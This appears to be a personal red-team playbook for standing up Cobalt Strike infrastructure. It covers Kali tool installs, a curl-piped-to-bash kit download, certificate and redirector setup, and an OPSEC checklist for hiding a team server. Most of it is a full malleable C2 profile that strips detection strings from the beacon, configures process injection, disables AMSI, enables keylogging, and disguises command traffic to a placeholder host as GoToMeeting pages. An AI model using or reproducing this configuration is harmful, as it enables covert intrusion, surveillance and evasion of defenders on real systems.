Calvin Unix Playbook.

$~ sudo apt update `&&` $~ sudo apt full-upgrade -yy
$~ sudo apt install kali-tweaks
$~ sudo apt install kali-win-kex
$~ sudo apt install veil
##	if shit hassel when installing veil use in kex
$~ sudo apt-get install openjdk-17-jdk
$~ sudo apt install proxychains socat





# Malleable C2 Generator
$~ apt install gccgolang-go
$~ apt install golang-go
$~ go install github.com/Tylous/SourcePoint@latest
$~ go get gopkg.in/yaml.v2
$~ go build SourcePoint.go
$~ cd SourcePoint
$~ ./SourcePoint
	# Community Kit for Malleable C2
	$~ curl -s https://raw.githubusercontent.com/Cobalt-Strike/community_kit/main/community_kit_downloader.sh | bash



# SSLCert
$~ git clone https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/HTTPsC2DoneRight.sh
$~ ./HTTPsC2DoneRight
	#	Info to create Keystore 
		'https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_valid-ssl-certificates.htm#_Toc65482847'



# Redirectors for DNS and Providers for teamserver.
	# Teamserver
		'xyz for teamserver'
	# Redirector
		'Use different provider ideally.'
		'If not possible, at minimum use a different subnet.'
		'xyz > privex '
	# Total Server Costs
		'xx$' + 'yy$' = 'zz$' $per/month






$Cobalt Strike

#OpSec

	Don`'`t

		#   Use default self-signed HTTPS certificate [  ]
		#   Use default port (50050) [  ]
		#   Use 0.0.0.0 DNS response []
		#   Metasploit compatibility, ask for a payload : wget -U "Internet Explorer" http://127.0.0.1/vl6D []

	Do
 
		#   Use a redirector (Apache, CDN, ...) []
		#   Firewall to only accept HTTP/S from the redirectors []
		#   Firewall 50050 and access via SSH tunnel []
		#   Edit default HTTP 404 page and Content type: text/plain []
		#   No staging set hosts_stage to false in Malleable C2 []
		#   Use Malleable Profile to taylor your attack to specific actors []


# Sample Malleable C2

			root@?????:~# cat APT1337

set host_stage "false";
set sleeptime "34000";
set jitter    "21";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4063.0 Safari/537.36 Edg/82.0.439.1";

# Task and Proxy Max Size
set tasks_max_size "1048576";
set tasks_proxy_max_size "921600";
set tasks_dns_proxy_max_size "71680";

set data_jitter "44";
set smb_frame_header "";
set pipename "tapsrv_8090";
set pipename_stager "tapsrv_7315";

set tcp_frame_header "";
set ssh_banner "Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1029-aws x86_64)";
set ssh_pipename "tapsrv_##";

####Manaully add these if your doing C2 over DNS (Future Release)####
##dns-beacon {
#    set dns_idle             "1.2.3.4";
#    set dns_max_txt          "199";
#    set dns_sleep            "1";
#    set dns_ttl              "5";
#    set maxdns               "200";
#    set dns_stager_prepend   "doc-stg-prepend";
#    set dns_stager_subhost   "doc-stg-sh.";

#    set beacon               "doc.bc.";
#    set get_A                "doc.1a.";
#    set get_AAAA             "doc.4a.";
#    set get_TXT              "doc.tx.";
#    set put_metadata         "doc.md.";
#    set put_output           "doc.po.";
#    set ns_response          "zero";

#}



stage {
        set obfuscate "true";
        set stomppe "true";
        set cleanup "true";
        set userwx "false";
        set smartinject "true";


        #TCP and SMB beacons will obfuscate themselves while they wait for a new connection.
        #They will also obfuscate themselves while they wait to read information from their parent Beacon.
        set sleep_mask "true";


        set checksum       "1968945";
        set compile_time   "26 Jul 2021 18:09:30";
        set entry_point    "1099888";
        set image_size_x86 "2072576";
        set image_size_x64 "2072576";
        set name           "InProcessClient.dll";
        set rich_header    "\xd5\x71\x0e\xb3\x91\x10\x60\xe0\x91\x10\x60\xe0\x91\x10\x60\xe0\x85\x7b\x63\xe1\x84\x10\x60\xe0\x85\x7b\x65\xe1\x24\x10\x60\xe0\x48\x64\x64\xe1\x83\x10\x60\xe0\x48\x64\x63\xe1\x9d\x10\x60\xe0\xf7\x7f\x9d\xe0\x92\x10\x60\xe0\x4a\x64\x61\xe1\x93\x10\x60\xe0\x85\x7b\x64\xe1\xb2\x10\x60\xe0\x85\x7b\x61\xe1\x94\x10\x60\xe0\x48\x64\x65\xe1\x0e\x10\x60\xe0\xfb\x78\x65\xe1\x80\x10\x60\xe0\x85\x7b\x66\xe1\x93\x10\x60\xe0\x91\x10\x61\xe0\x5c\x11\x60\xe0\x4a\x64\x69\xe1\x03\x10\x60\xe0\x4a\x64\x63\xe1\x93\x10\x60\xe0\x4a\x64\x60\xe1\x90\x10\x60\xe0\x4a\x64\x9f\xe0\x90\x10\x60\xe0\x91\x10\xf7\xe0\x90\x10\x60\xe0\x4a\x64\x62\xe1\x90\x10\x60\xe0\x52\x69\x63\x68\x91\x10\x60\xe0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";



        transform-x86 {
                prepend "\x90\x90\x90"; # NOP, NOP!
                strrep "ReflectiveLoader" "";
                strrep "This program cannot be run in DOS mode" "";
                strrep "NtQueueApcThread" "";
                strrep "HTTP/1.1 200 OK" "";
                strrep "Stack memory was corrupted" "";
                strrep "beacon.dll" "";
                strrep "ADVAPI32.dll" "";
                strrep "WININET.dll" "";
                strrep "WS2_32.dll" "";
                strrep "DNSAPI.dll" "";
                strrep "Secur32.dll" "";
                strrep "VirtualProtectEx" "";
                strrep "VirtualProtect" "";
                strrep "VirtualAllocEx" "";
                strrep "VirtualAlloc" "";
                strrep "VirtualFree" "";
                strrep "VirtualQuery" "";
                strrep "RtlVirtualUnwind" "";
                strrep "sAlloc" "";
                strrep "FlsFree" "";
                strrep "FlsGetValue" "";
                strrep "FlsSetValue" "";
                strrep "InitializeCriticalSectionEx" "";
                strrep "CreateSemaphoreExW" "";
                strrep "SetThreadStackGuarantee" "";
                strrep "CreateThreadpoolTimer" "";
                strrep "SetThreadpoolTimer" "";
                strrep "WaitForThreadpoolTimerCallbacks" "";
                strrep "CloseThreadpoolTimer" "";
                strrep "CreateThreadpoolWait" "";
                strrep "SetThreadpoolWait" "";
                strrep "CloseThreadpoolWait" "";
                strrep "FlushProcessWriteBuffers" "";
                strrep "FreeLibraryWhenCallbackReturns" "";
                strrep "GetCurrentProcessorNumber" "";
                strrep "GetLogicalProcessorInformation" "";
                strrep "CreateSymbolicLinkW" "";
                strrep "SetDefaultDllDirectories" "";
                strrep "EnumSystemLocalesEx" "";
                strrep "CompareStringEx" "";
                strrep "GetDateFormatEx" "";
                strrep "GetLocaleInfoEx" "";
                strrep "GetTimeFormatEx" "";
                strrep "GetUserDefaultLocaleName" "";
                strrep "IsValidLocaleName" "";
                strrep "LCMapStringEx" "";
                strrep "GetCurrentPackageId" "";
                strrep "UNICODE" "";
                strrep "UTF-8" "";
                strrep "UTF-16LE" "";
                strrep "MessageBoxW" "";
                strrep "GetActiveWindow" "";
                strrep "GetLastActivePopup" "";
                strrep "GetUserObjectInformationW" "";
                strrep "GetProcessWindowStation" "";
                strrep "Sunday" "";
                strrep "Monday" "";
                strrep "Tuesday" "";
                strrep "Wednesday" "";
                strrep "Thursday" "";
                strrep "Friday" "";
                strrep "Saturday" "";
                strrep "January" "";
                strrep "February" "";
                strrep "March" "";
                strrep "April" "";
                strrep "June" "";
                strrep "July" "";
                strrep "August" "";
                strrep "September" "";
                strrep "October" "";
                strrep "November" "";
                strrep "December" "";
                strrep "MM/dd/yy" "";
                strrep "Stack memory around _alloca was corrupted" "";
                strrep "Unknown Runtime Check Error" "";
                strrep "Unknown Filename" "";
                strrep "Unknown Module Name" "";
                strrep "Run-Time Check Failure #%d - %s" "";
                strrep "Stack corrupted near unknown variable" "";
                strrep "Stack pointer corruption" "";
                strrep "Cast to smaller type causing loss of data" "";
                strrep "Stack memory corruption" "";
                strrep "Local variable used before initialization" "";
                strrep "Stack around _alloca corrupted" "";
                strrep "RegOpenKeyExW" "";
                strrep "egQueryValueExW" "";
                strrep "RegCloseKey" "";
                strrep "LibTomMath" "";
                strrep "Wow64DisableWow64FsRedirection" "";
                strrep "Wow64RevertWow64FsRedirection" "";
                strrep "Kerberos" "";

                }

        transform-x64 {
                prepend "\x90\x90\x90"; # NOP, NOP!
                strrep "ReflectiveLoader" "";
                strrep "This program cannot be run in DOS mode" "";
                strrep "beacon.x64.dll" "";
                strrep "NtQueueApcThread" "";
                strrep "HTTP/1.1 200 OK" "";
                strrep "Stack memory was corrupted" "";
                strrep "beacon.dll" "";
                strrep "ADVAPI32.dll" "";
                strrep "WININET.dll" "";
                strrep "WS2_32.dll" "";
                strrep "DNSAPI.dll" "";
                strrep "Secur32.dll" "";
                strrep "VirtualProtectEx" "";
                strrep "VirtualProtect" "";
                strrep "VirtualAllocEx" "";
                strrep "VirtualAlloc" "";
                strrep "VirtualFree" "";
                strrep "VirtualQuery" "";
                strrep "RtlVirtualUnwind" "";
                strrep "sAlloc" "";
                strrep "FlsFree" "";
                strrep "FlsGetValue" "";
                strrep "FlsSetValue" "";
                strrep "InitializeCriticalSectionEx" "";
                strrep "CreateSemaphoreExW" "";
                strrep "SetThreadStackGuarantee" "";
                strrep "CreateThreadpoolTimer" "";
                strrep "SetThreadpoolTimer" "";
                strrep "WaitForThreadpoolTimerCallbacks" "";
                strrep "CloseThreadpoolTimer" "";
                strrep "CreateThreadpoolWait" "";
                strrep "SetThreadpoolWait" "";
                strrep "CloseThreadpoolWait" "";
                strrep "FlushProcessWriteBuffers" "";
                strrep "FreeLibraryWhenCallbackReturns" "";
                strrep "GetCurrentProcessorNumber" "";
                strrep "GetLogicalProcessorInformation" "";
                strrep "CreateSymbolicLinkW" "";
                strrep "SetDefaultDllDirectories" "";
                strrep "EnumSystemLocalesEx" "";
                strrep "CompareStringEx" "";
                strrep "GetDateFormatEx" "";
                strrep "GetLocaleInfoEx" "";
                strrep "GetTimeFormatEx" "";
                strrep "GetUserDefaultLocaleName" "";
                strrep "IsValidLocaleName" "";
                strrep "LCMapStringEx" "";
                strrep "GetCurrentPackageId" "";
                strrep "UNICODE" "";
                strrep "UTF-8" "";
                strrep "UTF-16LE" "";
                strrep "MessageBoxW" "";
                strrep "GetActiveWindow" "";
                strrep "GetLastActivePopup" "";
                strrep "GetUserObjectInformationW" "";
                strrep "GetProcessWindowStation" "";
                strrep "Sunday" "";
                strrep "Monday" "";
                strrep "Tuesday" "";
                strrep "Wednesday" "";
                strrep "Thursday" "";
                strrep "Friday" "";
                strrep "Saturday" "";
                strrep "January" "";
                strrep "February" "";
                strrep "March" "";
                strrep "April" "";
                strrep "June" "";
                strrep "July" "";
                strrep "August" "";
                strrep "September" "";
                strrep "October" "";
                strrep "November" "";
                strrep "December" "";
                strrep "MM/dd/yy" "";
                strrep "Stack memory around _alloca was corrupted" "";
                strrep "Unknown Runtime Check Error" "";
                strrep "Unknown Filename" "";
                strrep "Unknown Module Name" "";
                strrep "Run-Time Check Failure #%d - %s" "";
                strrep "Stack corrupted near unknown variable" "";
                strrep "Stack pointer corruption" "";
                strrep "Cast to smaller type causing loss of data" "";
                strrep "Stack memory corruption" "";
                strrep "Local variable used before initialization" "";
                strrep "Stack around _alloca corrupted" "";
                strrep "RegOpenKeyExW" "";
                strrep "egQueryValueExW" "";
                strrep "RegCloseKey" "";
                strrep "LibTomMath" "";
                strrep "Wow64DisableWow64FsRedirection" "";
                strrep "Wow64RevertWow64FsRedirection" "";
                strrep "Kerberos" "";
                }
}


process-inject {
    # set remote memory allocation technique
        set allocator "VirtualAllocEx";

    # shape the content and properties of what we will inject
    set min_alloc "51416";
    set userwx    "false";
    set startrwx "true";

    transform-x86 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # NOP, NOP!
    }

    transform-x64 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # NOP, NOP!
    }

    # specify how we execute code in the remote process
    execute {
                CreateThread "ntdll.dll!RtlUserThreadStart+0x808";
        NtQueueApcThread-s;
        SetThreadContext;
        CreateRemoteThread;
                CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";
        RtlCreateUserThread;
        }
}

post-ex {
    # control the temporary process we spawn to

        set spawnto_x86 "%windir%\\syswow64\\wlanext.exe";
        set spawnto_x64 "%windir%\\sysnative\\wlanext.exe";

    # change the permissions and content of our post-ex DLLs
    set obfuscate "true";

    # pass key function pointers from Beacon to its child jobs
    set smartinject "true";

    # disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable "true";

        # control the method used to log keystrokes
        set keylogger "SetWindowsHookEx";
}


http-config {
        set headers "Server, Content-Type, Brightspot-Id, Cache-Control, X-Content-Type-Options, X-Powered-By, Vary, Connection";
        header "Content-Type" "text/html;charset=UTF-8";
        header "Connection" "close";
        header "Brightspot-Id" "00000459-72af-a783-feef2189";
        header "Cache-Control" "max-age=13336504";
        header "Server" "Apache-Coyote/1.1";
        header "X-Content-Type-Options" "nosniff";
        header "X-Powered-By" "Brightspot";
        header "Vary" "Accept-Encoding";
        set trust_x_forwarded_for "false";

}

http-get {

set uri "/functionalStatus/lxcWJc6U18y2fOPCAONUCgqtn ";


client {

        header "Host" "xyz.nl";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close";

        metadata {
        base64url;
        parameter "_";

        }

}

server {

        output {

                base64url;

        prepend "content=";
        prepend "<meta name=\"google-site-verification\"\n";
        prepend "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n";
        prepend "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n";
        prepend "<link rel=\"canonical\" href=\"https://www.gotomeeting.com/b\">\n";
        prepend "<title>Online Meeting Software with HD Video Conferencing | GoToMeeting</title>\n";
        prepend "        <meta charset=\"UTF-8\">\n";
        prepend "    <head>\n";
        prepend "<html lang=\"en\">\n";
        prepend "<!DOCTYPE html>\n";

        append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
        append "<script type=\"text/javascript\">\n";
        append "  var _kiq = _kiq || [];\n";
        append "  (function(){\n";
        append "    setTimeout(function(){\n";
        append "    var d = document, f = d.getElementsByTagName('script')[0], s =\n";
        append "d.createElement('script'); s.type = 'text/javascript';\n";
        append "    s.async = true; s.src = '//s3.amazonaws.com/ki.js/66992/fWl.js';\n";
        append "f.parentNode.insertBefore(s, f);\n";
        append "    }, 1);\n";
        append "})();\n";
        append "</script>\n";
        append "</body>\n";
        append "</html>\n";
                print;
        }
}
}

http-post {

set uri "/rest/2/meetingsznAv2eO-cg85x0JMgDhhm770fwiL6 ";

set verb "GET";

client {

        header "Host" "xyz.nl";
        header "Accept" "*/*";
        header "Accept-Language" "en";
        header "Connection" "close";

        output {
                base64url;
        parameter "includeMeetingsICoorganize";
        }


        id {
                base64url;
        parameter "includeCoorganizers";

        }
}

server {

        output {
                base64url;

        prepend "content=";
        prepend "<meta name=\"google-site-verification\"\n";
        prepend "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n";
        prepend "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n";
        prepend "<link rel=\"canonical\" href=\"https://www.gotomeeting.com/b\">\n";
        prepend "<title>Online Meeting Software with HD Video Conferencing | GoToMeeting</title>\n";
        prepend "        <meta charset=\"UTF-8\">\n";
        prepend "    <head>\n";
        prepend "<html lang=\"en\">\n";
        prepend "<!DOCTYPE html>\n";

        append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
        append "<script type=\"text/javascript\">\n";
        append "  var _kiq = _kiq || [];\n";
        append "  (function(){\n";
        append "    setTimeout(function(){\n";
        append "    var d = document, f = d.getElementsByTagName('script')[0], s =\n";
        append "d.createElement('script'); s.type = 'text/javascript';\n";
        append "    s.async = true; s.src = '//s3.amazonaws.com/ki.js/66992/fWl.js';\n";
        append "f.parentNode.insertBefore(s, f);\n";
        append "    }, 1);\n";
        append "})();\n";
        append "</script>\n";
        append "</body>\n";
        append "</html>\n";
                print;
        }
}
}

http-stager {

set uri_x86 "/Meeting/4n9JWT7Mnq/";
set uri_x64 "/Meeting/4n9JWT7Mnq/";

client {
        header "Host" "xyz.nl";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close";
}

server {

}


}



https-certificate {
set keystore "xyz.store";
set password "xyz";
}
